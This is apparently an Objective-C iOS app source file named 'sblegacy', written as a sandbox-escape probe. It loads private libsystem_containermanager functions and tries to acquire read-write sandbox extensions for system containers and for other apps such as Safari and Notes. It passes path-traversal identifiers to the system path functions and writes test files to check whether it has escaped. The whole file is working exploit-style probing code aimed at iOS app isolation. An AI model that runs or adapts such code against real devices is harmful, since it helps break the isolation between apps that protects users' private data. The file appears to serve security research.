// sblegacy — old libsystem_containermanager APIs + MobileHouseArrest identity.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <signal.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);
typedef void *(*fn_old_create_path)(const char *, int, int *);
typedef void *(*fn_old_copy_from_path)(const char *, int *);
typedef char *(*fn_old_copy_path)(void *);
typedef int (*fn_old_acquire)(void *, const char *, uint64_t);
typedef void (*fn_old_free)(void *);
typedef char *(*fn_old_sysgroup_path)(const char *, int *);
typedef char *(*fn_old_sys_path)(const char *, int *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids, q_group_ids;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static fn_old_create_path old_create_path;
static fn_old_copy_from_path old_copy_from_path;
static fn_old_copy_path old_copy_path;
static fn_old_acquire old_acquire;
static fn_old_free old_free;
static fn_old_sysgroup_path old_sysgroup_path;
static fn_old_sys_path old_sys_path;
static FILE *gLog;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sblegacy] %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail"); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_identifiers");
    q_group_ids = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    old_create_path = (fn_old_create_path)dlsym(h, "container_create_or_lookup_path");
    old_copy_from_path = (fn_old_copy_from_path)dlsym(h, "container_copy_from_path");
    old_copy_path = (fn_old_copy_path)dlsym(h, "container_copy_path");
    old_acquire = (fn_old_acquire)dlsym(h, "container_acquire_sandbox_extension");
    old_free = (fn_old_free)dlsym(h, "container_free_object");
    old_sysgroup_path = (fn_old_sysgroup_path)dlsym(h, "container_system_group_path_for_identifier");
    old_sys_path = (fn_old_sys_path)dlsym(h, "container_system_path_for_identifier");
    L(@"legacy create=%p copyFrom=%p copyPath=%p acquire=%p free=%p sysgroup=%p sys=%p",
      old_create_path, old_copy_from_path, old_copy_path, old_acquire, old_free, old_sysgroup_path, old_sys_path);
    return q_create && q_get && q_token && s_consume;
}

static void checkPath(NSString *p, const char *tag) {
    errno = 0; DIR *d = opendir(p.fileSystemRepresentation);
    BOOL ok = d != NULL; if (d) closedir(d);
    NSString *m = [p stringByAppendingPathComponent:[NSString stringWithFormat:@"sblegacy_%s", tag]];
    errno = 0; int fd = open(m.fileSystemRepresentation, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    fprintf(stderr, "CHECK %s opendir=%d errno=%d write=%d werrno=%d path=%s\n", tag, ok, errno, fd, errno, p.UTF8String);
    if (fd >= 0) { write(fd,"x",1); close(fd); unlink(m.fileSystemRepresentation); }
}

struct result { int ok; int obj; int acquire; int err; int fd; char path[512]; char token[2048]; };

static void tryOld(const char *path, int which, int fd) {
    alarm(5);
    struct result r; memset(&r,0,sizeof(r));
    int err = 0;
    void *obj = NULL;
    if (which == 0) obj = old_create_path ? old_create_path(path, 0, &err) : NULL;
    else if (which == 1) obj = old_create_path ? old_create_path(path, 1, &err) : NULL;
    else obj = old_copy_from_path ? old_copy_from_path(path, &err) : NULL;
    r.obj = obj ? 1 : 0; r.err = err;
    if (obj && old_copy_path) {
        char *p = old_copy_path(obj);
        if (p) { strncpy(r.path, p, sizeof(r.path)-1); free(p); }
    }
    if (obj && old_acquire) {
        const char *cls = "com.apple.app-sandbox.read-write";
        r.acquire = (int)old_acquire(obj, cls, 0);
        r.ok = 1;
    }
    if (r.ok && r.path[0]) {
        errno = 0; int wfd = open(r.path, O_RDONLY|O_DIRECTORY);
        r.fd = wfd; if (wfd >= 0) close(wfd);
    }
    if (obj && old_free) old_free(obj);
    write(fd, &r, sizeof(r));
    _exit(0);
}

static void runOld(NSString *label, const char *path) {
    for (int which = 0; which < 3; which++) {
        int fds[2]; if (pipe(fds) != 0) return;
        pid_t pid = fork();
        if (pid == 0) { close(fds[0]); tryOld(path, which, fds[1]); _exit(0); }
        close(fds[1]);
        struct result r; memset(&r,0,sizeof(r));
        read(fds[0], &r, sizeof(r)); close(fds[0]);
        int st=0; waitpid(pid,&st,0);
        L(@"[%@ %s] obj=%d err=%d acquire=%d path=%s fd=%d crash=%d", label,
          which == 2 ? "copy_from_path" : (which ? "create_true" : "create_false"), r.obj, r.err, r.acquire,
          r.path, r.fd, WIFSIGNALED(st) ? WTERMSIG(st) : 0);
        if (r.ok) {
            NSString *p = [NSString stringWithUTF8String:r.path];
            if (p.length) {
                errno = 0; DIR *d = opendir(p.fileSystemRepresentation);
                L(@"[%@] opendir %@ -> %p errno=%d", label, p, d, errno);
                if (d) closedir(d);
                NSString *m = [p stringByAppendingPathComponent:@"sblegacy_marker"];
                errno = 0; int mfd = open(m.fileSystemRepresentation, O_CREAT|O_WRONLY|O_TRUNC, 0644);
                L(@"[%@] write %@ -> %d errno=%d", label, m, mfd, errno);
                if (mfd >= 0) { write(mfd,"x",1); close(mfd); unlink(m.fileSystemRepresentation); }
            }
        }
    }
}

static void probeModern(NSString *label, uint64_t cls, NSString *ident, BOOL group, uint64_t part, uint64_t flags) {
    void *q = q_create();
    q_class(q, cls);
    void *x = xpc_string ? xpc_string(ident.UTF8String) : NULL;
    if (group) { if (q_group_ids) q_group_ids(q, x); }
    else { if (q_ids) q_ids(q, x); }
    q_part(q, part); q_flags(q, flags);
    void *res = q_get(q);
    char *tok = (res && q_token) ? q_token(res) : NULL;
    const char *tp = "";
    if (tok) { const char *p = strrchr(tok, ';'); tp = p ? p+1 : ""; }
    L(@"[%@] cls=%llu group=%d part=%llu flags=0x%llx res=%p tok=%s path=%s", label,
      (unsigned long long)cls, group, (unsigned long long)part, (unsigned long long)flags,
      res, tok ? "YES" : "NO", tp);
    if (tok) {
        int64_t h = s_consume(tok);
        L(@"[%@] consume=%lld", label, (long long)h);
        if (h >= 0) {
            NSString *p = [NSString stringWithUTF8String:tp];
            if (p.length) {
                errno = 0; DIR *d = opendir(p.fileSystemRepresentation);
                L(@"[%@] opendir %@ -> %p errno=%d", label, p, d, errno);
                if (d) closedir(d);
                NSString *m = [p stringByAppendingPathComponent:@"sblegacy_marker"];
                errno = 0; int fd = open(m.fileSystemRepresentation, O_CREAT|O_WRONLY|O_TRUNC, 0644);
                L(@"[%@] write %@ -> %d errno=%d", label, m, fd, errno);
                if (fd >= 0) { write(fd,"x",1); close(fd); unlink(m.fileSystemRepresentation); }
            }
            s_release(h);
        }
        free(tok);
    }
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
}

static void runProbe(void) {
    @autoreleasepool {
        NSString *home = NSHomeDirectory();
        gLog = fopen([home stringByAppendingPathComponent:@"Documents/sblegacy.log"].fileSystemRepresentation, "w");
        L(@"=== sblegacy start pid=%d bundle=%@", getpid(), [[NSBundle mainBundle] bundleIdentifier]);
        if (!load()) return;
        NSString *groot = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.8e0bc870a21520b9.1"].path;
        NSArray<NSString *> *paths = @[@"/", @"/private/var",
            @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
            @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
            @"/private/var/containers/Data/System/com.apple.geod",
            NSHomeDirectory(),
            groot ?: @"/"];
        for (NSString *p in paths) runOld([NSString stringWithFormat:@"old-%@", p], p.fileSystemRepresentation);
        NSArray<NSString *> *traversals = @[@"../../../../../../..", @"../../../../private/var",
            @"../../../../var/mobile/Library/Preferences",
            @"../../Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
            @"com.apple.geod/../../../../..", @"/"];
        for (NSString *idn in traversals) {
            int e = 0; char *sp = old_sys_path ? old_sys_path(idn.UTF8String, &e) : NULL;
            L(@"sys_path_traversal id=%@ -> %s err=%d", idn, sp ? sp : "(null)", e);
            if (sp) { runOld([NSString stringWithFormat:@"trav-%@", idn], sp); free(sp); }
            e = 0; char *gp = old_sysgroup_path ? old_sysgroup_path(idn.UTF8String, &e) : NULL;
            L(@"sysgroup_traversal id=%@ -> %s err=%d", idn, gp ? gp : "(null)", e);
            if (gp) { runOld([NSString stringWithFormat:@"gtrav-%@", idn], gp); free(gp); }
        }
        if (old_sysgroup_path) {
            int e=0; char *p = old_sysgroup_path("systemgroup.com.apple.mobilegestaltcache", &e);
            L(@"sysgroup_path=%s err=%d", p ? p : "(null)", e);
            if (p) { runOld(@"sysgroup-path", p); free(p); }
        }
        if (old_sys_path) {
            int e=0; char *p = old_sys_path("com.apple.geod", &e);
            L(@"sys_path=%s err=%d", p ? p : "(null)", e);
            if (p) { runOld(@"sys-path", p); free(p); }
        }
        NSArray<NSString *> *apps = @[@"com.apple.Preferences", @"com.apple.mobilesafari",
            @"com.apple.geod", @"com.apple.mobilenotes", @"com.apple.PosterBoard"];
        for (NSString *a in apps) probeModern(a, 2, a, NO, 0, 0x900000000ULL);
        for (NSString *a in apps) probeModern(a, 12, a, NO, 0, 0x900000000ULL);
        NSArray<NSString *> *groups = @[@"group.com.apple.notes", @"systemgroup.com.apple.mobilegestaltcache",
            @"group.8e0bc870a21520b9.1"];
        for (NSString *g in groups) probeModern(g, 7, g, YES, 0, 0x900000000ULL);
        probeModern(@"mg13", 13, @"systemgroup.com.apple.mobilegestaltcache", YES, 3, 0x8100000000ULL);
        L(@"=== sblegacy done ===");
        if (gLog) { fclose(gLog); gLog = NULL; }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sblegacy"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
